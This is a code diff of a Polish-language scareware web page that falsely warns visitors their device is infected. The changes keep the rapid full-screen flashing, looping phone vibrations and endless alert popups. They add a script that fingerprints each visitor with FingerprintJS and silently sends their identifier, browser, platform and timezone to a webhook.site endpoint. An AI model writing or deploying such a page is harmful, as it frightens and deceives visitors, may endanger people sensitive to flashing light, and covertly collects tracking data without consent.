@@ -5,66 +5,62 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>⚠️ Twoje urządzenie zostało zainfekowane!</title>
   <style>
-    /* Reset i layout */
-    html,body{margin:0;padding:0;height:100%;overflow:hidden;font-family:sans-serif;}
-    body{display:flex;flex-direction:column;justify-content:center;align-items:center;background:#000;color:#fff;text-align:center;}
-    h1{font-size:6vw;line-height:1.1;margin:0 1rem;text-shadow:0 0 20px red;}
-    #flash{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;animation:flash 0.15s infinite;}
-    @keyframes flash{0%{background:rgba(255,0,0,0.8);}50%{background:rgba(0,0,0,0.8);}100%{background:rgba(255,0,0,0.8);}}
-    .btn{margin-top:2rem;padding:1rem 2rem;font-size:1.2rem;border:none;border-radius:12px;background:#ff0000;color:#fff;cursor:pointer;}
+    /* ---------- PODSTAWOWY STYL (migający ekran & krzykliwy tekst) ---------- */
+    html,body{margin:0;padding:0;height:100%;overflow:hidden;font-family:sans-serif;background:#000;color:#fff;}
+    @keyframes flash{0%,49%{background:#000;color:#ff0000;}50%,100%{background:#ff0000;color:#000;}}
+    body{display:flex;flex-direction:column;justify-content:center;align-items:center;animation:flash 0.8s infinite;}
+    h1{font-size:clamp(2rem,6vw,3.5rem);text-align:center;margin:0 1rem;letter-spacing:1px;font-weight:900;}
+    p{font-size:clamp(1.25rem,3vw,1.75rem);margin:1rem;text-align:center;}
   </style>
 </head>
 <body>
-  <div id="flash"></div>
-  <h1>⚠️ UWAGA! TWÓJ TELEFON ZOSTAŁ ZAINFEKOWANY ⚠️</h1>
-  <button class="btn" onclick="stopEffects()">Zamknij</button>
+  <h1>⚠️ UWAGA! TWOJE URZĄDZENIE ZOSTAŁO ZAINFEKOWANE!</h1>
+  <p>Zamknij stronę natychmiast, aby ograniczyć szkody!</p>
 
-  <!-- Dźwięk alarmu (podmień src na własny plik MP3) -->
-  <audio id="alarm" src="alarm.mp3" loop></audio>
+  <!-- Punkt montażu ewentualnego licznika -->
+  <!-- <span id="visitCount"></span> -->
 
-<script>
-(function(){
-  const alarm = document.getElementById('alarm');
-  alarm.volume = 1;
-  // Spróbuj odtworzyć dźwięk natychmiast – nie wszystkie przeglądarki pozwolą
-  alarm.play().catch(()=>{});
-
-  const vibrationPattern = [400, 200, 400, 200, 800];
-  let vibrated = false;
-
-  function vibrateNow(){
+  <script>
+    /* ---------- NATYCHMIASTOWE WIBRACJE I ALERTY ---------- */
     if (navigator.vibrate) {
-      navigator.vibrate(vibrationPattern);
-      vibrated = true;
+      /* Krótka sekwencja na przywitanie + pętla co 3 s */
+      navigator.vibrate([150,50,300,50,150]);
+      setInterval(() => navigator.vibrate([200,50,100]), 3000);
     }
-  }
+    setTimeout(() => alert('⚠️ TWOJE DANE SĄ W NIEBEZPIECZEŃSTWIE!'), 400);
+    setInterval(() => alert('⚠️ TWOJE DANE SĄ W NIEBEZPIECZEŃSTWIE!'), 8000);
+  </script>
 
-  /* 🔥 ZMIANA: natychmiastowe wibracje tuż po załadowaniu skryptu */
-  vibrateNow();
+  <!-- ---------- FINGERPRINTING + WEBHOOK ---------- -->
+  <!-- Biblioteka FingerprintJS (open‑source) -->
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js" defer></script>
+  <script>
+  (async function sendFingerprint() {
+    try {
+      /* Poczekaj aż biblioteka się zainicjuje */
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
 
-  // Fallback – pierwszy dotyk użytkownika (iOS wymaga gestu)
-  window.addEventListener('touchstart', ()=>{ if(!vibrated) vibrateNow(); }, {once:true});
+      /* Minimalny zbiór danych (RODO‑lite) */
+      const payload = {
+        visitorId: result.visitorId,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toISOString()
+      };
 
-  // Utrzymuj efekt co 3 s
-  setInterval(vibrateNow, 3000);
-
-  // Pętla z komunikatami alert
-  setTimeout(function alertLoop(){
-    alert('⚠️ Twój telefon jest zainfekowany! ⚠️');
-    setTimeout(alertLoop, 5000);
-  }, 400);
-
-  // Próba otwierania nowych kart (może być blokowane)
-  setInterval(()=>{ window.open('about:blank', '_blank'); }, 7000);
-})();
-
-function stopEffects(){
-  if(navigator.vibrate) navigator.vibrate(0);
-  const alarm = document.getElementById('alarm');
-  alarm.pause();
-  alarm.currentTime = 0;
-  document.location.reload();
-}
-</script>
+      /* WYMIENIĆ na swój endpoint (np. https://your.webhook.endpoint) */
+      fetch('https://webhook.site/#!/view/e14a76a4-a0b6-429b-a7b7-0c744665866e/775fc6e8-d3c5-4124-af4e-3b6c74d950a5/1', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      console.error('Fingerprint/Webhook error:', e);
+    }
+  })();
+  </script>
 </body>
 </html>
